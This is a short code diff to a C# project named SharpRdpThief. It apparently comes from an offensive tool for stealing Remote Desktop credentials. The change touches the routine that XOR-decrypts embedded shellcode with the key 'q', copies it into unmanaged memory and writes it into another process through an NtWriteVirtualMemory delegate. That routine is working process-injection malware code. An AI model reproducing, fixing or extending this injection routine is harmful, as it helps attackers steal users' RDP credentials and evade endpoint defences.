@@ -133,11 +133,12 @@ namespace SharpRdpThief
                             NtWriteVirtualMemory ntWriteVirtualMemory = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWriteVirtualMemory));
 
                             // XOR-decrypt the shellcode
+                            byte[] dec = new byte[rDllRawBytes.Length];
                             for (int j = 0; j < rDllRawBytes.Length; j++)
-                                rDllRawBytes[j] = (byte)(rDllRawBytes[j] ^ (byte)'q');
+                                dec[j] = (byte)(rDllRawBytes[j] ^ (byte)'q');
 
-                            var buffer = Marshal.AllocHGlobal(rDllRawBytes.Length);
-                            Marshal.Copy(rDllRawBytes, 0, buffer, rDllRawBytes.Length);
+                            var buffer = Marshal.AllocHGlobal(dec.Length);
+                            Marshal.Copy(dec, 0, buffer, dec.Length);
 
                             uint bytesWritten = 0;
 
@@ -145,7 +146,7 @@ namespace SharpRdpThief
                                 hProcess,
                                 baseAddress,
                                 buffer,
-                                (uint)rDllRawBytes.Length,
+                                (uint)dec.Length,
                                 ref bytesWritten);
 
                             if (result == 0)
